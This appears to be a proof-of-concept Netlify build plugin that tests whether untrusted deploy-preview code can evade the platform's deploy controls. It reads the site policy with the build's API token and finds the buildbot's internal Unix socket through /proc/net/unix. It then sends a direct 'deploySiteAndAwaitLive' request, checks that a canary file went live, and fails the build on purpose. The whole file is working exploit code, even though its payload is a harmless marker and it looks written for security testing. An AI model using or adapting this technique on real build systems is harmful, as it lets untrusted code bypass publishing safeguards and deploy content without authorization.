import { readFileSync, unlinkSync, writeFileSync } from 'node:fs'
import { createConnection } from 'node:net'
import { isAbsolute, relative, resolve } from 'node:path'

const MARKER_FILE = '__untrusted_socket_precontrol_canary.txt'
const MARKER = 'netlify-untrusted-socket-precontrol-canary-v1'

const normalizeApiHost = (apiHost) =>
  /^https?:\/\//i.test(apiHost || '') ? apiHost : `https://${apiHost || 'api.netlify.com'}`

const readSitePolicy = async ({ token, siteId, apiHost }) => {
  try {
    const endpoint = new URL(`/api/v1/sites/${encodeURIComponent(siteId)}`, apiHost)
    const response = await fetch(endpoint, {
      headers: { Authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    let body = null
    try {
      body = await response.json()
    } catch {}
    return {
      status: response.status,
      untrustedFlow:
        typeof body?.build_settings?.untrusted_flow === 'string'
          ? body.build_settings.untrusted_flow
          : null,
      publicRepo: body?.build_settings?.public_repo === true,
    }
  } catch (error) {
    return { requestFailed: true, errorClass: error?.constructor?.name || 'Error' }
  }
}

const findBuildbotSocket = () => {
  try {
    const paths = readFileSync('/proc/net/unix', 'utf8')
      .split('\n')
      .slice(1)
      .filter(Boolean)
      .map((line) => line.trim().split(/\s+/)[7])
      .filter((path) => path && /(?:netlify|buildbot)/i.test(path) && !path.startsWith('@'))
    return paths.length === 1 ? paths[0] : null
  } catch {
    return null
  }
}

const requestEarlyDeploy = (deployDir) =>
  new Promise((resolveRequest) => {
    const socketPath = findBuildbotSocket()
    const result = {
      socketFound: Boolean(socketPath),
      connected: false,
      requestWritten: false,
      responseReceived: false,
      responseSucceeded: false,
      timedOut: false,
    }
    if (!socketPath) return resolveRequest(result)

    let response = ''
    let settled = false
    const client = createConnection({ path: socketPath })
    const timer = setTimeout(() => {
      result.timedOut = true
      finish()
    }, 90_000)
    const finish = () => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      client.destroy()
      let parsed
      try {
        parsed = JSON.parse(response)
      } catch {}
      result.responseWasJson = parsed !== undefined
      result.responseSucceeded = parsed?.succeeded === true
      result.responseErrorType = ['none', 'user', 'system'].includes(parsed?.values?.error_type)
        ? parsed.values.error_type
        : null
      result.responseCodePresent = typeof parsed?.values?.code === 'string'
      resolveRequest(result)
    }

    client.once('connect', () => {
      result.connected = true
      client.write(
        JSON.stringify({ action: 'deploySiteAndAwaitLive', deployDir, environment: [] }),
        (error) => {
          result.requestWritten = !error
          if (error) finish()
        },
      )
    })
    client.on('data', (chunk) => {
      result.responseReceived = true
      response += chunk.toString('utf8').slice(0, 8_192)
      finish()
    })
    client.once('error', finish)
    client.once('close', finish)
  })

const verifyMarker = async () => {
  const deployUrl = process.env.DEPLOY_PRIME_URL || process.env.DEPLOY_URL
  if (!deployUrl) return { attempted: false }
  try {
    const endpoint = new URL(`/${MARKER_FILE}`, deployUrl)
    endpoint.searchParams.set('probe', Date.now().toString(36))
    const response = await fetch(endpoint, {
      cache: 'no-store',
      headers: { 'Cache-Control': 'no-cache' },
      redirect: 'error',
      signal: AbortSignal.timeout(20_000),
    })
    const body = response.ok ? await response.text() : ''
    return { attempted: true, status: response.status, markerMatched: body.trim() === MARKER }
  } catch (error) {
    return { attempted: true, failed: true, errorClass: error?.constructor?.name || 'Error' }
  }
}

export const onPostBuild = async ({ constants, utils }) => {
  const publishDir = resolve(constants.PUBLISH_DIR || '')
  const repositoryRoot = resolve(process.cwd())
  const deployDir = relative(repositoryRoot, publishDir) || '.'
  const publishInsideRepository = !isAbsolute(deployDir) && !deployDir.startsWith('..')
  const token = constants.NETLIFY_API_TOKEN
  const siteId = constants.SITE_ID
  const policy =
    typeof token === 'string' && token.length > 0 && typeof siteId === 'string' && siteId.length > 0
      ? await readSitePolicy({
          token,
          siteId,
          apiHost: normalizeApiHost(constants.NETLIFY_API_HOST),
        })
      : null
  const result = {
    phase: 'untrusted-plugin-socket-before-failed-build-v3',
    context: process.env.CONTEXT || null,
    reviewIdPresent: Boolean(process.env.REVIEW_ID),
    policy,
    publishInsideRepository,
    markerContainsSecretMaterial: false,
    markerWritten: false,
    markerRemoved: false,
    controlledFailureRequested: false,
  }

  if (
    process.env.CONTEXT !== 'deploy-preview' ||
    policy?.untrustedFlow !== 'redact' ||
    !publishInsideRepository
  ) {
    console.log(`NETLIFY_UNTRUSTED_SOCKET_PROBE ${JSON.stringify(result)}`)
    return
  }

  const markerPath = resolve(publishDir, MARKER_FILE)
  try {
    writeFileSync(markerPath, `${MARKER}\n`, { encoding: 'utf8', mode: 0o600 })
    result.markerWritten = true
    result.deploy = await requestEarlyDeploy(deployDir)
    if (result.deploy.responseSucceeded) result.liveOracle = await verifyMarker()
  } finally {
    try {
      unlinkSync(markerPath)
      result.markerRemoved = true
    } catch {}
  }

  result.controlledFailureRequested = result.deploy?.responseSucceeded === true
  console.log(`NETLIFY_UNTRUSTED_SOCKET_PROBE ${JSON.stringify(result)}`)
  if (result.controlledFailureRequested) {
    utils.build.failBuild('Controlled failure after direct buildbot socket deployment')
  }
}
